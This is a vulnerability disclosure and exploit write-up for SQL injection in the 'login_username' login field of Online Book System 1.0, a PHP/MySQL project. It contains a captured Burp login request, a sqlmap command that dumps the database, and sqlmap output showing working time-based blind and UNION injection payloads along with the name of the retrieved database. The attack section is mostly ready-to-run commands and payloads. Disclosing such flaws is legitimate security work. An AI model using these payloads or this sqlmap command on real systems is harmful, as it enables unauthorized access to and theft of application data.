# Online Book System- SQL Injection - 1
+ **Exploit Title:** Online Book System- SQL Injection
+ **Date:** 2024-26-03
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/online-book-system-in-php-css-js-and-mysql-free-download/
+ **Software Link:** https://download.code-projects.org/details/74c24d93-431e-4e31-acc1-802f14caef5c
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Online Book System 1.0 allows SQL Injection via the 'login_username' parameter at "localhost/BookStore-master 1/index.php". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "localhost/BookStore-master 1/index.php"
+ Try logging in by typing random things
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:

```
POST /BookStore-master%201/index.php HTTP/1.1
Host: localhost
Content-Length: 62
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/BookStore-master%201/index.php?Message=successfully%20logged%20out!!
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; continueCode=5vLeVxlRzkNb47vKDPMo5Lq8wdzLtvf1Hem0jn6EZm2ygrX19BpaQWOJY3oM; welcomebanner_status=dismiss; cookieconsent_status=dismiss; PHPSESSID=b7g245tvc3rrau75lpnecgj00n
Connection: close

login_username=test%40test.com&login_password=123&submit=login

```

+ Use sqlmap to exploit. In sqlmap, use 'login_username' parameter to dump the database.
```
sqlmap -r r.txt -p login_username --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: login_username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: login_username=test@test.com' AND (SELECT 7570 FROM (SELECT(SLEEP(5)))Dszz)-- Jmvh&login_password=123&submit=login

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: login_username=test@test.com' UNION ALL SELECT CONCAT(0x717a627871,0x6a58496948665473534274466f59496b544a5a78504b5265646f4f4c415351764244716e714d476c,0x71707a7871),NULL-- -&login_password=123&submit=login
---
[12:03:00] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[12:03:00] [INFO] fetching current database
current database: 'u385439067_store'

```
+ current database: `u385439067_store`

![Ekran görüntüsü 2024-03-26 191029](https://github.com/BurakSevben/CVEs/assets/117217689/c2c32bbb-640b-47b9-bd35-7e526542778c)
